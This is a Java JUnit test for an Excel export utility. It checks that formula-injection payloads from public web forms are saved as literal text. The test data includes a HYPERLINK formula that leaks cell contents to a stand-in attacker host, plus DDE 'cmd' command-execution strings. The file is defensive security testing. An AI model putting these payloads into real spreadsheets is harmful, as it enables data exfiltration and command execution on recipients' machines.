package sie.siejuridicos.common.excel;

import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;

// Cubre el hallazgo real de la auditoría de seguridad: nombre/mensaje/notas de las
// exportaciones a Excel vienen de formularios públicos sin autenticar (POST
// /api/solicitudes, POST /api/marketing/suscriptores), así que un remitente puede
// intentar meter un payload de inyección de fórmulas (CWE-1236). Prueba a través de la
// API pública generar(): genera el .xlsx real y lo vuelve a leer con Apache POI para
// confirmar el tipo de celda resultante, no solo el string en memoria.
class ExcelExporterTest {

    private Cell primeraCeldaDeDatos(byte[] xlsx) throws IOException {
        try (XSSFWorkbook workbook = new XSSFWorkbook(new ByteArrayInputStream(xlsx))) {
            Sheet sheet = workbook.getSheetAt(0);
            Row fila = sheet.getRow(1);
            return fila.getCell(0);
        }
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "=HYPERLINK(\"http://evil.example/leak?x=\"&A1,\"Ver más\")",
            "+cmd|'/c calc'!A1",
            "-2+3+cmd|'/c calc'!A1",
            "@SUM(1+1)",
    })
    void unValorQueEmpiezaComoFormulaSeGuardaComoTextoLiteral(String payloadMalicioso) throws IOException {
        byte[] xlsx = ExcelExporter.generar("Hoja", List.of("Nombre"), List.of(List.of(payloadMalicioso)));
        Cell celda = primeraCeldaDeDatos(xlsx);

        // La prueba real: el tipo de celda NUNCA debe ser FORMULA. sanearContraFormulas
        // antepone un apóstrofe LITERAL al string guardado (no un flag de estilo de
        // Excel): por eso el valor que se lee de vuelta con POI empieza con ese
        // apóstrofe seguido del payload original tal cual, en vez del caracter
        // peligroso directamente en la posición 0.
        assertNotEquals(CellType.FORMULA, celda.getCellType());
        assertEquals(CellType.STRING, celda.getCellType());
        assertEquals("'" + payloadMalicioso, celda.getStringCellValue());
    }

    @Test
    void unNombreNormalNoSeAlteraEnLoAbsoluto() throws IOException {
        byte[] xlsx = ExcelExporter.generar("Hoja", List.of("Nombre"), List.of(List.of("María Fernanda Restrepo")));
        Cell celda = primeraCeldaDeDatos(xlsx);
        assertEquals("María Fernanda Restrepo", celda.getStringCellValue());
    }

    @Test
    void unMensajeQueSoloContieneUnSimboloDeIgualEnMedioNoSeToca() throws IOException {
        // Solo el PRIMER caracter importa (así funciona la interpretación real de
        // fórmulas en Excel): un "=" en medio del texto es contenido legítimo.
        byte[] xlsx = ExcelExporter.generar("Hoja", List.of("Mensaje"),
                List.of(List.of("Necesito ayuda, mi caso = urgente")));
        Cell celda = primeraCeldaDeDatos(xlsx);
        assertEquals("Necesito ayuda, mi caso = urgente", celda.getStringCellValue());
    }
}
